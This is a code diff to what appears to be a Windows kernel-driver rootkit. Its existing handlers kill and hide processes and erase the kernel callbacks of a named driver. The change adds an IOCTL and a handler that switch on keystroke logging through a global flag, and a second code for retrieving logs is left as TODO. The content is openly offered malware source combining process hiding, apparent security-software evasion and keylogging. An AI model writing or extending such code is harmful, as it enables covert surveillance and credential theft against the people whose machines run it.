@@ -37,6 +37,9 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
 #define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define BE_IOCTL_ERASE_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+#define BE_IOCTL_START_KEYLOGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define BE_IOCTL_GET_KEYLOG CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS) // TODO
+
 typedef struct _CALLBACK_DATA {
     UINT64 driverBase;
     UINT64 offset;
@@ -55,6 +58,7 @@ NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlHideProcess(HANDLE pid);
 NTSTATUS BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
 NTSTATUS BeIoctlEraseCallbacks(PWCHAR targetDriver, ULONG dwSize);
+NTSTATUS BeIoctlStartKeylogger(BOOLEAN start);
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -143,6 +147,13 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
                 PWCHAR targetDriver = (PWCHAR)buffer;
                 ULONG stringSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
                 status = BeIoctlEraseCallbacks(targetDriver, stringSize);
+            }
+            break;
+
+        case BE_IOCTL_START_KEYLOGGER:
+            {
+                BOOLEAN start = *(BOOLEAN*)buffer;
+                status = BeIoctlStartKeylogger(start);
             }
             break;
         }
@@ -485,4 +496,18 @@ BeIoctlEraseCallbacks(PWCHAR targetDriver, ULONG dwSize)
     }
 
     return NtStatus;
+}
+
+/**
+ * Starts or stops the keylogger.
+ *
+ * @param start TRUE to start, FALSE to stop
+ * @return NTSTATUS status code.
+ */
+NTSTATUS
+BeIoctlStartKeylogger(BOOLEAN start)
+{
+    BeGlobals::logKeys = start;
+
+    return STATUS_SUCCESS;
 }
